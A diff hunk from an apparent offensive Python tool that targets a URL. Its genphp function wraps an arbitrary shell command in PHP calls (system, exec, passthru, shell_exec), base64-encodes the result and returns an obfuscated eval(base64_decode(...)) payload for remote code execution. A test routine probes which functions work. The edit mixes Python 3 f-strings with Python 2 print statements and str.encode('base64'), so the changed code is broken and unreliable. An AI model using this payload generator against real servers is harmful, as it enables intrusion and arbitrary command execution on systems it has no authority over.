@@ -24,17 +24,16 @@ print "\n[+] URL in use: %s \n" %(url)
 # Whole Bunch of Functions #
 ###                      ###
 def genphp(func, cmd):
-    if func == "system":
-        rawphp = """system('%s');""" %(cmd)
-    elif func == "shellexec":
-        rawphp = """echo shell_exec('%s');""" %(cmd)
+    if func == "exec":
+        rawphp = f"""echo exec('{cmd}');"""
     elif func == "passthru":
-        rawphp = """passthru('%s');""" %(cmd)
-    elif func == "exec":
-        rawphp = """echo exec('%s');""" %(cmd)
+        rawphp = f"""passthru('{cmd}');"""
+    elif func == "shellexec":
+        rawphp = f"""echo shell_exec('{cmd}');"""
+    elif func == "system":
+        rawphp = f"""system('{cmd}');"""
     encodedphp = rawphp.encode('base64')
-    payload = """<?php eval(base64_decode('%s')); ?>""" %(encodedphp)
-    return payload
+    return f"""<?php eval(base64_decode('{encodedphp}')); ?>"""
 
 def test(url, tester, testkey): # This whole function is ugly as sin
     print "[+] Testing system()" # I need to make it tighter
